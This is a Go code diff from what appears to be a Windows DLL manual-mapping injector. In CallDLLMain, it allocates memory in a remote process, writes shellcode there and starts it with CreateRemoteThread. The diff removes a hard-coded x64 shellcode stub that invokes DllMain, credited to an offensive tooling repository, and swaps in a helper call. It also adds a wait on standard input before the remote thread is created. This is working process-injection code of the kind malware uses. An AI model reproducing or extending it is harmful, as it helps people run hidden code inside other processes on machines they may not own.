@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"debug/pe"
 	"encoding/binary"
@@ -271,23 +272,8 @@ func RebaseImage(local_image []byte, peInfo PEInfo) error {
 }
 
 func CallDLLMain(remoteAddr uintptr, entry uintptr, processHandle uintptr) error {
-	//https://github.com/memN0ps/arsenal-rs/blob/main/manual_map-rs/src/lib.rs
-	// Thank you bon
 
-	//Only 64 bit currently
-	shellcode := []byte{
-		0x48, 0x83, 0xEC, 0x28, // sub rsp, 28h
-		0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, image_base  ; hinstDLL
-		0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00, // mov rdx, 1           ; fdwReason
-		0x4d, 0x31, 0xC0, // xor r8, r8           ; lpvReserved
-		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, entrypoint
-		0xFF, 0xD0, // call rax
-		0x48, 0x83, 0xC4, 0x28, // add rsp, 28h
-		0xC3, // ret
-	}
-
-	binary.LittleEndian.PutUint64(shellcode[6:], uint64(remoteAddr))
-	binary.LittleEndian.PutUint64(shellcode[26:], uint64(entry))
+	shellcode := code.Resolve(remoteAddr, entry)
 
 	shellCodeWriteHandle, err := VirtualAllocEx(
 		windows.Handle(processHandle),
@@ -309,6 +295,9 @@ func CallDLLMain(remoteAddr uintptr, entry uintptr, processHandle uintptr) error
 		return err
 	}
 
+	if _, err := bufio.NewReader(os.Stdin).ReadBytes('\n'); err != nil {
+		return nil
+	}
 	threadHandle, _, err := CreateRemoteThread(syscall.Handle(processHandle), nil, 0, shellCodeWriteHandle, 0, 0)
 	if err != nil {
 		return err
